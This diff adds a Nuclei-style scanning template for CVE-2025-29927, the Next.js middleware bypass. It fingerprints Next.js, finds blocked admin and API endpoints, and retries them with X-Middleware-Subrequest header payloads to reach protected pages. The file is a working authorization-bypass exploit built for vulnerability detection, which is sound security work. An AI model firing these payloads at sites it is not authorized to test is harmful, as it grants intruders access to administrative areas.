@@ -1,0 +1,94 @@
+id: BIZZY-KB-1971
+
+info:
+  name: Next.js Middleware Bypass - CVE-2025-29927
+  author: BIZZYLABS.IO
+  severity: critical
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36}
+
+    redirects: true
+    max-redirects: 3
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "_next/static"
+        internal: true
+
+      - type: word
+        part: header
+        words:
+          - "Next.js"
+        internal: true
+
+  - raw:
+      - |
+        GET {{endpoints}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36}
+
+    stop-at-first-match: true
+    payloads:
+      endpoints:
+        - '/admin/dashboard'
+        - '/admin/index'
+        - '/admin'
+        - '/dashboard'
+        - '/dashboard/admin'
+        - '/dashboard/home'
+        - '/admin/login'
+        - '/management'
+        - '/api/user'
+        - '/api/users'
+        - '/admin/users'
+        - '/secure'
+        - '/user/settings'
+        - '/manager'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_any(to_lower(header), 'x-middleware-rewrite', 'x-middleware-next', 'x-middleware-redirect') && status_code != 200
+          - contains_any(to_lower(location), 'unauthorized') && status_code != 200
+          - contains_any(to_lower(header), 'unauthorized') && status_code != 200
+        internal: true
+
+    extractors:
+      - type: dsl
+        name: bypass_paths
+        dsl:
+          - endpoints
+        internal: true
+  - raw:
+      - |
+        GET {{bypass_paths}} HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36}
+        X-Middleware-Subrequest: {{nextjs_headers}}
+
+    payloads:
+      nextjs_headers:
+        - 'middleware:middleware:middleware:middleware:middleware'
+        - 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
+        - 'pages/_middleware'
+        - 'pages/dashboard/_middleware'
+        - 'pages/dashboard/panel/_middleware'
+        - 'middleware'
+        - 'src/middleware'
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
